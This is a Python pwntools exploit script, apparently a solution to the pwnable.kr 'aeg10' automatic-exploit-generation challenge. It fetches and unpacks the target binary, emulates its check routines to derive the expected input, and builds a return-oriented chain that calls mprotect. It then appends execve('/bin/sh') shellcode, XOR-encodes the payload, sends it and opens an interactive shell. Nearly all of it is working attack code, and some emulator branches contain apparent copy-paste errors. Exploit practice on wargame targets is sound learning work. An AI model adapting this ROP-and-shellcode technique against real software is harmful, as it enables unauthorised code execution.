import time, struct, base64, os
from capstone import *
from pwn import *

pb = lambda x: struct.unpack("<B", x)
upb = lambda x: struct.unpack("<B", x)[0]
p32 = lambda x: struct.pack("<L", x)
up32 = lambda x: struct.unpack("<L", x)[0]

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

def var2hex(n):
	return "%#4x" % (n & 0xffffffff)

def convert_register(register):
	return (register & 0x000000ff)

_bin = "./aeg10"
payload_size_limits = 1000
tmp_pointer = 0
func_contents = ["\x55\x48\x89\xe5", "\xc9\xc3"]

instruction, src, dest = 0, 0, 0
eax, ecx, edx = 0, 0, 0

cmp_num1, cmp_num2, cmp_num3 = [], [], []
calc_num1, calc_num2, calc_num3 = [], [], []
payload, temp = '', ''
calc = []
result = []

def parsing_file():
	os.system("rm -rf ./aeg10")
	f = open("aeg10.Z", "wb")
	data = conn.recvuntil("hurry up!\n")
	base = (data.split("wait...\n")[1]).split("\n")[0]
	f.write(base64.decodestring(base))
	f.close()

def uncompress():
	os.system("uncompress ./aeg10.Z")

def imagebase(f):
	buf = f.read()
	base = buf[0x18:0x18+4]
	return buf, up32(base)

conn = remote('pwnable.kr', 9005)
parsing_file()
uncompress()
t1 = time.time()
f = open(_bin, "rb")
file_contents, base_addr = imagebase(f)
print "[*] ImageBase : %s" % str(hex(base_addr))

elf = ELF(_bin)
rop = ROP(elf)

puts_plt = elf.plt['puts']
mprotect_got = elf.got['mprotect']
memcpy_plt, memcpy_got = elf.plt['memcpy'], elf.got['memcpy']

print "[*] puts@plt : %s" % str(hex(puts_plt))
print "[*] mprotect@got : %s" % str(hex(mprotect_got))
print "[*] memcpy@plt : %s" % str(hex(memcpy_plt))
print "[*] memcpy@got : %s" % str(hex(memcpy_got))

point = "\x31\xed\x49\x89\xd1\x5e\x48\x89\xe2\x48"
gadget_point = "\x48\x8b\x5c\x24\x08\x48\x8b\x6c"
call_point = "\x4c\x89\xfa\x4c\x89\xf6\x44\x89"
xor_point = "\x83\xf2"
buf_point = "\x0f\xb6\x05"

base_file = file_contents.index(point)
gadget_file = file_contents.index(gadget_point)
call_file = file_contents.index(call_point)
xor_file = file_contents.index(xor_point)
xor_file2 = xor_file + 0x1e
buf_file = file_contents.index(buf_point)

xor1_str = file_contents[xor_file+2]
xor2_str = file_contents[xor_file2+2]
rip_bufvaddr = up32(file_contents[buf_file+3:buf_file+7])

xor1 = ord(xor1_str)
xor2 = ord(xor2_str)

register_gadget = base_addr + (gadget_file - base_file)
call_gadget = base_addr + (call_file - base_file)
buf_gadget = base_addr + (buf_file - base_file) + 0x7 # rip address of buf calc
buf_addr = rip_bufvaddr + buf_gadget - 0x2f

print "[*] xor value1 : " + str(xor1)
print "[*] xor value2 : " + str(xor2)
print "[*] Register Gadget : %s" % str(hex(register_gadget))
print "[*] Call Gadget : %s" % str(hex(call_gadget))
print "[*] Buffer Address : %s" % str(hex(buf_addr))

tmp = file_contents[base_file:]
vuln_func = tmp.index(func_contents[1])
offset = (vuln_func+2) + base_addr

calc.append(offset)
tmp = tmp[vuln_func+3:]

offset2 = tmp.index(func_contents[0])
offset = (offset+1) + offset2
calc.append(offset)

for i in xrange(14):
	tmp = tmp[offset2+10:]
	offset2 = tmp.index(func_contents[0])
	offset = (offset+10) + offset2
	calc.append(offset)

fileOffset = []
calc = calc[::-1]
for j in range(16):
	fileOffset.append((calc[j] - base_addr) + base_file)
idx = 0
a1, a2, a3 = [], [], []
# Virtualization (VCPU Initialization)
while idx < 16:
	val_d = 0
	val_c, val_8, val_4 = 0, 0, 0
	val_14, val_18, val_1c = 0, 0, 0
	chk = 0
	data = file_contents[fileOffset[idx]:]
	eax, ecx, edx, ebx = 0, 0, 0, 0
	eip = 25
	instruction = 0
	if ord(data[eip-1]) == 0x7d and ord(data[eip-2]) == 0x80:
		eip += 1
		val_14 = ord(data[eip])
		a1.append(val_14)
	else:
		val_4 = ord(data[eip])
		a1.append(val_4)
	eip += 1
	print "[*] %d Function" % idx
	while instruction != 0xe8:
		instruction = ord(data[eip])
		#print hex(instruction)

		# jnz
		if instruction == 0x75:
			eip += 2

		# movzx
		elif instruction == 0x0f and ord(data[eip+1]) == 0xb6:
			src, dest = ord(data[eip+2]), ord(data[eip+3])
			if src == 0x45:
				if dest == 0xfc:
					eax = val_4
				elif dest == 0xf8:
					eax = val_8
				elif dest == 0xf3:
					eax = val_d
				elif dest == 0xec:
					eax = val_14
				elif dest == 0xe8:
					eax = val_18
				elif dest == 0xe4:
					eax = val_1c
			elif src == 0x55:
				if dest == 0xfc:
					edx = val_4
				elif dest == 0xf8:
					edx = val_8
				elif dest == 0xf3:
					edx = val_d
				elif dest == 0xec:
					edx = val_14
				elif dest == 0xe8:
					edx = val_18
				elif dest == 0xe4:
					edx = val_1c

			eip += 4

		# mov reg, reg
		elif instruction == 0x89:
			target = ord(data[eip+1])
			if target == 0xd0:
				eax = edx
			elif target == 0xc2:
				edx = eax
			elif target == 0xc1:
				ecx = eax
			elif target == 0xcb:
				ebx = ecx
			elif target == 0xd8:
				eax = ebx
			elif target == 0xd1:
				ecx = edx
			elif target == 0xc8:
				eax = ecx
			elif target == 0xca:
				edx = ecx

			eip += 2

		# mov edx, var
		elif instruction == 0xba:
			var = ord(data[eip+1])
			edx = var
			eip += 5

		# mov ecx, var
		elif instruction == 0xb9:
			var = ord(data[eip+1])
			ecx = var
			eip += 5

		# mov [var], al
		elif instruction == 0x88:
			src, dest = ord(data[eip+1]), ord(data[eip+2])
			if src == 0x45:
				if dest == 0xf3:
					val_d = convert_register(int(var2hex(eax),16))
				elif dest == 0xfc:
					val_4 = convert_register(int(var2hex(eax),16))
				elif dest == 0xf8:
					val_8 = convert_register(int(var2hex(eax),16))
				elif dest == 0xec:
					val_14 = convert_register(int(var2hex(eax),16))
				elif dest == 0xe8:
					val_18 = convert_register(int(var2hex(eax),16))
				elif dest == 0xe4:
					val_1c = convert_register(int(var2hex(eax),16))

			elif src == 0x4d:
				if dest == 0xfc:
					val_d = convert_register(int(var2hex(ecx),16))
				elif dest == 0xfc:
					val_4 = convert_register(int(var2hex(ecx),16))
				elif dest == 0xf8:
					val_8 = convert_register(int(var2hex(ecx),16))
				elif dest == 0xec:
					val_14 = convert_register(int(var2hex(eax),16))
				elif dest == 0xe8:
					val_18 = convert_register(int(var2hex(eax),16))
				elif dest == 0xe4:
					val_1c = convert_register(int(var2hex(eax),16))

			eip += 3

		# add reg, reg
		elif instruction == 0x01:
			target = ord(data[eip+1])
			# add eax, eax
			if target == 0xc0:
				eax = eax + eax
			# add eax, edx
			elif target == 0xd0:
				eax = eax + edx
			# add eax, ecx
			elif target == 0xc8:
				eax = eax + ecx
			eip += 2

		# imul reg, reg
		elif instruction == 0x0f and ord(data[eip+1]) == 0xaf:
			target = ord(data[eip+2])
			# imul eax, edx
			if target == 0xc2:
				eax = eax * edx

			# imul eax, ecx
			elif target == 0xc1:
				eax = eax * ecx

			eip += 3

		# shl reg, var
		elif instruction == 0xc1:
			dest, src = ord(data[eip+1]), ord(data[eip+2])
			if dest == 0xe2:
				edx = edx << src
			elif dest == 0xe0:
				eax = eax << src
			elif dest == 0xe1:
				ecx = ecx << src

			eip += 3

		# lea ecx, ds:0[rax*4]
		elif instruction == 0x8d and ord(data[eip+1]) == 0x0c and ord(data[eip+2]) == 0x85 and ord(data[eip+3]) == 0x00 and ord(data[eip+4]) == 0x00 and ord(data[eip+5]) == 0x00 and ord(data[eip+6]) == 0x00:
			ecx = eax * 4
			eip += 7

		# lea ecx, [rax+rdx]
		elif instruction == 0x8d and ord(data[eip+1]) == 0x0c and ord(data[eip+2]) == 0x10:
			ecx = eax + edx
			eip += 3

		# lea edx, ds:0[rax*8]
		elif instruction == 0x8d and ord(data[eip+1]) == 0x14 and ord(data[eip+2]) == 0xc5 and ord(data[eip+3]) == 0x00 and ord(data[eip+4]) == 0x00 and ord(data[eip+5]) == 0x00 and ord(data[eip+6]) == 0x00:
			edx = eax * 8
			eip += 7

		# lea edx, ds:0[rax*4]
		elif instruction == 0x8d and ord(data[eip+1]) == 0x14 and ord(data[eip+2]) == 0x85 and ord(data[eip+3]) == 0x00 and ord(data[eip+4]) == 0x00 and ord(data[eip+5]) == 0x00 and ord(data[eip+6]) == 0x00:
			edx = eax * 4
			eip += 7

		#lea ecx, ds:0[rax*8]
		elif instruction == 0x8d and ord(data[eip+1]) == 0x0c and ord(data[eip+2]) == 0xc5 and ord(data[eip+3]) == 0x00 and ord(data[eip+4]) == 0x00 and ord(data[eip+5]) == 0x00 and ord(data[eip+6]) == 0x00:
			ecx = eax * 8
			eip += 7
			
		# sub al, [var]
		elif instruction == 0x2a and ord(data[eip+1]) == 0x45:
			temp2 = ord(data[eip+2])
			var = ord(data[eip+4])
			al = convert_register(int(var2hex(eax),16))

			if temp2 == 0xf8:
				val_8 = convert_register(int(var2hex(al - var),16)) & 0x000000ff
				a2.append(val_8)
			elif temp2 == 0xf4:
				val_c = convert_register(int(var2hex(al - var),16)) & 0x000000ff
				a3.append(val_c)
			elif temp2 == 0xfc:
				val_4 = convert_register(int(var2hex(al - var),16)) & 0x000000ff
				a1.append(val_4)
			elif temp2 == 0xec:
				val_14 = convert_register(int(var2hex(al - var),16)) & 0x000000ff
				a1.append(val_14)
			elif temp2 == 0xe8:
				val_18 = convert_register(int(var2hex(al - var),16)) & 0x000000ff
				a2.append(val_18)
			elif temp2 == 0xe4:
				val_1c = convert_register(int(var2hex(al - var),16)) & 0x000000ff
				a3.append(val_1c)

			eax, ecx, edx = 0, 0, 0
			eip += 3

		# sub dl, al
		elif instruction == 0x28 and ord(data[eip+1]) == 0xc2:
			al = convert_register(int(var2hex(eax), 16))
			dl = convert_register(int(var2hex(edx), 16))
			edx = (edx & 0xffffff00) + (int(var2hex(dl - al),16) & 0x000000ff)
			eip += 2
		
		# cmp al, var
		#elif instruction == 0x3c:
			#var = ord(data[eip+1])
			#chk += 1
			#eip += 2
		
		# add al, [var]
		elif instruction == 0x02:
			al = convert_register(int(var2hex(eax),16))
			dest = ord(data[eip+1])
			src = ord(data[eip+2])

			if dest == 0x45:
				if src == 0xfc:
					eax = (eax & 0xffffff00) + convert_register(int(var2hex(al + val_4),16))
				elif src == 0xec:
					eax = (eax & 0xffffff00) + convert_register(int(var2hex(al + val_14),16))
				elif src == 0xf8:
					eax = (eax & 0xffffff00) + convert_register(int(var2hex(al + val_8),16))
				elif src == 0xf4:
					eax = (eax & 0xffffff00) + convert_register(int(var2hex(al + val_c),16))
				elif src == 0xe8:
					eax = (eax & 0xffffff00) + convert_register(int(var2hex(al + val_18),16))
				elif src == 0xe4:
					eax = (eax & 0xffffff00) + convert_register(int(var2hex(al + val_1c),16))
			eip += 3

		elif instruction == 0x3a and ord(data[eip+1]) == 0x45:
			src = ord(data[eip+2])
			al = convert_register(int(var2hex(eax), 16))
			if src == 0xf8:
				val_8 = al
				a2.append(val_8)
			elif src == 0xfc:
				val_4 = al
				a1.append(val_4)
			elif src == 0xf4:
				val_c = al
				a3.append(val_c)
			elif src == 0xec:
				val_14 = al
				a1.append(val_14)
			elif src == 0xe8:
				val_18 = al
				a2.append(val_14)
			elif src == 0xe4:
				val_1c = al
				a3.append(val_1c)

			eax, ecx, edx = 0, 0, 0
			eip += 3

		# sub bl, al
		elif instruction == 0x28 and ord(data[eip+1]) == 0xc3:
			bl = convert_register(int(var2hex(ebx), 16))
			al = convert_register(int(var2hex(eax), 16))
			ebx = (ebx & 0xffffff00) + (int(var2hex(bl - al),16) & 0x000000ff)
			eip += 2

		# sub al, dl
		elif instruction == 0x28 and ord(data[eip+1]) == 0xd0:
			dl = convert_register(int(var2hex(edx), 16))
			al = convert_register(int(var2hex(eax), 16))
			eax = (eax & 0xffffff00) + (int(var2hex(al - dl),16) & 0x000000ff)
			eip += 2
		
		# sub cl, dl
		elif instruction == 0x28 and ord(data[eip+1]) == 0xd1:
			cl = convert_register(int(var2hex(ecx), 16))
			dl = convert_register(int(var2hex(edx), 16))
			ecx = (ecx & 0xffffff00) + (int(var2hex(cl - dl),16) & 0x000000ff)
			eip += 2

		# sub cl, al
		elif instruction == 0x28 and ord(data[eip+1]) == 0xc1:
			cl = convert_register(int(var2hex(ecx), 16))
			al = convert_register(int(var2hex(eax), 16))
			ecx = (ecx & 0xffffff00) + (int(var2hex(cl - al),16) & 0x000000ff)
			eip += 2

		# jnz -> cmp direct
		elif instruction == 0x80 and ord(data[eip+1]) == 0x7d and ord(data[eip-2]) == 0x75:
			src = ord(data[eip+2])
			var = ord(data[eip+3])
			if src == 0xf8:
				val_8 = var
				a2.append(var)
			elif src == 0xfc:
				val_4 = var
				a1.append(var)
			elif src == 0xf4:
				val_c = var
				a3.append(var)
			elif src == 0xec:
				val_14 = var
				a1.append(var)
			elif src == 0xe8:
				val_18 = var
				a2.append(var)
			elif src == 0xe4:
				val_1c = var
				a3.append(var)
			eip += 4
		else:
			eip += 1

	idx += 1

all_buf = []

for i in range(0, len(a1)):
	print "--------------------------------------"
	print "[*] a1 : %s" % str(hex(a1[i]))
	print "[*] a2 : %s" % str(hex(a2[i]))
	print "[*] a3 : %s" % str(hex(a3[i]))
	all_buf.append(a1[i])
        all_buf.append(a2[i])
        all_buf.append(a3[i])
	if i == len(a1)-1:
		print "--------------------------------------"

payload = ""

for i in range(0, len(all_buf)):
	if i % 2 == 0:
		value = all_buf[i] ^ xor1
	else:
		value = all_buf[i] ^ xor2
	if value < 16:
		payload += "0" + hex(value)[2:]
	else:
		payload += hex(value)[2:]

attack_payload = "A"*0x48
attack_payload += p64(register_gadget)
attack_payload += p64(0) # just NULL Byte
attack_payload += p64(0) # rbx = 0
attack_payload += p64(1) # rbp = 1
attack_payload += p64(mprotect_got) # r12 = mprotect_got
attack_payload += p64(buf_addr & 0xFFFFF000) # argv1
attack_payload += p64(0x2000) # argv2
attack_payload += p64(0x7) # artv3
attack_payload += p64(call_gadget)
attack_payload += "A"*56
attack_payload += p64(buf_addr+0x30+len(attack_payload)+8)
attack_payload += shellcode

real_payload = payload

for i in range(0, len(attack_payload)):
	if i % 2 == 0:
		value = ord(attack_payload[i]) ^ xor1
	else:
		value = ord(attack_payload[i]) ^ xor2
	if value < 16:
		real_payload += "0" + hex(value)[2:]
	else:
		real_payload += hex(value)[2:]

print "\n\n" + real_payload + "\n"
f.close()
t2 = time.time()
print t2 - t1

conn.send(real_payload + "\n")
conn.interactive()